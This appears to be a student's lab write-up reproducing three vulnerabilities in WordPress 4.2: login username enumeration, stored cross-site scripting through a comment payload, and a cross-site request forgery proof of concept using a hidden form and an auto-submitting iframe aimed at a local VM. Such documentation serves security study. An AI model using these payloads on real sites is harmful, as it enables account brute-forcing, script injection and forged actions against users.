# Project 7
Time Spent: 11 Hours

### Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress


### 1. Enumeration
  - [x] Summary: 
    - Vulnerability types: Enumeration
    - Tested in version: Word Press 4.2
    - Fixed in version: 4.2.1
  - [x] GIF Walkthrough: 
<img src='WordPress Username Enumeration.gif' title='WordPress Username Enumeration' width='' alt='' />
  - [x] Steps to recreate: <br /> Start at a WordPress Login page. This vulnerability allows anyone the ability to enumerate a list of valid user names on a WordPress site. Start with typing "admin" and a random password, soon after you are alerted that there is an existing admin account, ultimately making it easier to brute force that admin password. 
  - [ ] Affected source code:
    - [Link 1]
    
    
### 2. Authenticated Stored Cross-Site Scripting (XSS)
  - [X] Summary: inject java script code as a comment 
    - Vulnerability types:XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [X] GIF Walkthrough: 
<img src='XSS Exploit.gif' title='XSS Exploit' width='' alt='' />
  - [X] Steps to recreate: <br />
         First start by finding a post to leave a comment on. Next, leave a comment with the following content:<br />
         *\< b onmouseover="alert('This is just a vulnerability')">click me!\</b>*
         
  - [X] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/blob/4.2-branch/wp-comments-post.php)
    
### 3. Authenticated Cross Site Request Forgery
  - [X] Summary: Create a hidden form that can be submitted by another user when the page loads. Example below leads to infinite loop. Will lead you to page saying "dupilcate comment deleted; it looks as though you've already said that!".
    - Vulnerability types: CSRF
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [X] GIF Walkthrough: 
<img src='CSRF Exploit.gif' title='XSS Exploit' width='' alt='' />
  - [X] Steps to recreate: <br />
        -Start with creating a new comment that includes the javascript code for a new form. Next, below that comment, create an iframe that will run the form when it loads. Once that is complete, submit the comment. If nothing appears, try refreshing page. <br /> 
        
        Proof of Concept:
          <form action="http://wpdistillery.vm/wp-comments-post.php" method="post" id="commentform2" class="comment-form" novalidate>
            <input name="comment" type="hidden" value="hello there">
            <input type="hidden" name="comment_post_ID" value="3" id="comment_post_ID">
            <input type="hidden" name="comment_parent" id="comment_parent" value="0">
            <input type="hidden" id="_wp_unfiltered_html_comment_disabled" name="_wp_unfiltered_html_comment" value="8bfe964cea">
           </form>

          <iframe src=# onload=document.getElementById('commentform2').submit()> </iframe>
          
         
  - [X] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/blob/4.2-branch/wp-comments-post.php)
    
